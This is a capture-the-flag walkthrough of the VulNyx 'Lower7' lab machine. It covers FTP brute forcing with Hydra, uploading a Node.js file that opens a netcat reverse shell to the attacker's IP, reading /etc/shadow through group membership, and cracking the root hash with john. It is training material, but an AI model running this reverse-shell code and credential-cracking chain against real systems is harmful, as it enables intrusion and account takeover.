# VulNyx - Lower7

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.16
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-19 10:55 +07
Nmap scan report for 10.11.5.16
Host is up (0.00094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:F1:B7:40 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.19 seconds
```

### Shell
We connect to the service `ftp` and list the user `a.clark` in the welcome banner.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ftp root@10.11.5.16                                                      
Connected to 10.11.5.16.
220 "Hello a.clark, Welcome to your FTP server."
331 Please specify the password.
Password: 
```
#### Hydra
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ hydra -t 64 -l a.clark -P /usr/share/wordlists/rockyou.txt ftp://10.11.5.16 -F
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-19 11:10:40
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://10.11.5.16:21/
[21][ftp] host: 10.11.5.16   login: a.clark   password: dragon
[STATUS] attack finished for 10.11.5.16 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-19 11:10:54
```

```bash                                                                           
┌──(dungcngo㉿kali)-[/tmp]
└─$ ftp a.clark@10.11.5.16 
Connected to 10.11.5.16.
220 "Hello a.clark, Welcome to your FTP server."
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||45839|)
150 Here comes the directory listing.
drwxrwxrwx    2 1000     1000         4096 Oct 13  2025 .
drwxrwxrwx    2 1000     1000         4096 Oct 13  2025 ..
226 Directory send OK.
ftp> 
```
Since there is an HTTP server on port `3000` based on `Node.js`, we're uploading a reverse shell `.js` file.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat exploit.js 
const { exec } = require('child_process');

module.exports = (req, res) => {
  exec('busybox nc 10.11.5.4 4444 -e /bin/sh', (error, stdout) => {
    res.send(`${stdout.trim()}`);
  });
};
```
```bash
ftp> put exploit.js 
local: exploit.js remote: exploit.js
229 Entering Extended Passive Mode (|||37105|)
150 Ok to send data.
100% |****************************************|   189      668.73 KiB/s    00:00 ETA
226 Transfer complete.
189 bytes sent in 00:00 (44.65 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||6208|)
150 Here comes the directory listing.
drwxrwxrwx    2 1000     1000         4096 May 19 06:46 .
drwxrwxrwx    2 1000     1000         4096 May 19 06:46 ..
-rw-------    1 1000     1000          189 May 19 06:46 exploit.js
226 Directory send OK.

```

**Web**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl "http://10.11.5.16:3000"                                    

<html>
<body>
  <h1>It works!</h1>
  <p>This is the default web page for this server.</p>
  <p>The web server software is running but no content has been added, yet.</p>
</body>
</html>

┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -sX GET "http://10.11.5.16:3000/exploit.js"
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.16] 54668
id ; hostname
uid=1000(a.clark) gid=1000(a.clark) grupos=1000(a.clark),42(shadow)
lower7
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
a.clark@lower7:~$ 
```

### Privilege Escalation
#### Enumeration
The user `a.clark` is part of the `shadow` group
```bash
a.clark@lower7:~$ id
uid=1000(a.clark) gid=1000(a.clark) grupos=1000(a.clark),42(shadow)
a.clark@lower7:~$ groups
a.clark shadow
```

#### Abuse
```bash
a.clark@lower7:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 740 oct 13  2025 /etc/shadow
a.clark@lower7:~$ grep root /etc/shadow
root:$y$j9T$9VFLJjKZix0Ugj9YsoOCS.$z0FVk.1CCNx/YRzEmwjcz6z4oYqa7YD6QyXd52jxyLD:20374:0:99999:7:::
```
Use `john` to crack hash.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nano hash                   
                                                                                  
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat hash      
$y$j9T$9VFLJjKZix0Ugj9YsoOCS.$z0FVk.1CCNx/YRzEmwjcz6z4oYqa7YD6QyXd52jxyLD
                                                                                  
┌──(dungcngo㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bassman          (?)     
1g 0:00:03:27 DONE (2026-05-19 12:01) 0.004829g/s 81.13p/s 81.13c/s 81.13C/s ice-cream..yenifer
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Password of `root` is `bassamn`.
```bash
a.clark@lower7:~$ su - root
Contraseña: 
root@lower7:~# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
lower7
```

#### Flags
```bash
root@lower7:~# find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
97b79229372dea359415afef3e350241
9f903b45d270a2d0b95c68b4f3aac03f
```


***You are welcome!***
